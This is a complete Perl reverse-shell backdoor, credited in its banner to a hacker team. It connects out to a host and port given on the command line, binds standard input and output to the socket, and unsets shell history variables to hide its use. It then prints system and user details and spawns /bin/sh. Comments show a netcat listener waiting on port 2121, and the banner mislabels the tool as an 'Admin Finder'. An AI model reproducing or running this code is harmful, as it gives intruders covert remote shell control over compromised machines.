#!/usr/bin/perl 
use IO::Socket; 
###########################################################################
#KONEKTADO BACKDOOR EDITED BY ScopeX && jHr                               #
#bacteriamalware@gmail.com:/home/programing$ perl bc.pl                   #
#Konektado Backdoor Shell ResbackPH TeaM Philippines Hacker Link          # 
###########################################################################
#Usage: bc.pl [Host] [Port]                                               #
#Ex: bc.pl 127.0.0.1 2121                                                 #
#bacteriamalware@gmail.com:/home/programing$ perl bc.pl 127.0.0.1 2121    #
#[*] Resolving HostName                                                   #
#[*] Connecting... 127.0.0.1                                              #
#[*] Spawning Shell                                                       #
#[*] Connected to remote host                                             #
###########################################################################

###########################################################################
#bash-2.05b# nc -vv -l -p 2121                                            #
#listening on [any] 2121 ...                                              #
#connect to [127.0.0.1] from localhost [127.0.0.1] 32769                  #
#Konektado Backdoor Shell ResbackPH TeaM Philippines Hacker Link          #
###########################################################################

$system    = '/bin/sh'; 
$ARGC=@ARGV; 
print "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n\n";
print "\t> [!]=================================================[!]   >\n\n";
print "\t>  |   ResbackPH TeaM Philippines Hacker Link          |    >\n\n";
print "\t>  |     Created By ScopeX and jHr                     |    >\n\n";
print "\t>  |   server irc:  irc.zone-h.esy.es (6667)           |    >\n\n";
print "\t>  |            Admin Finder 2018                      |    >\n\n";  
print "\t> [x]=================================================[x]   >\n\n";
print "\t>  |   [-] Please wait loading to scanning...          |    >\n\n";
print "\t>  | K0nt - powerboxxx - RamZkiE - roin - uyap - bogel |    >\n\n";
print "\t>  |      powerboxxx - div - OpCode - Ken - David      |    >\n\n";
print "\t> [!] ======Th4nks to all legendary Friend============ [!]  >\n\n";
print "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n\n";
if ($ARGC!=2) { 
  print "Usage: $0 [Host] [Port] \n\n\n"; 
  die "Ex: $0 127.0.0.1 2121 \n\n"; 
} 
use Socket; 
use FileHandle; 
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n\n"; 
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n\n"; 
print "[*] Resolving HostName\n\n"; 
print "[*] Connecting... $ARGV[0] \n\n"; 
print "[*] Spawning Shell \n\n"; 
print "[*] Connected to remote host \n\n"; 
SOCKET->autoflush(); 
open(STDIN, ">&SOCKET"); 
open(STDOUT,">&SOCKET"); 
open(STDERR,">&SOCKET"); 
print "Konektado Backdoor Shell ResbackPH TeaM Philippines Hacker Link \n\n"; 
system("unset HISTFILE; unset SAVEHIST;echo;Systeminfo; uname -a;echo; 
echo Userinfo; id;echo;echo Directory; pwd;echo; echo Shell "); 
system($system); 
#EOF
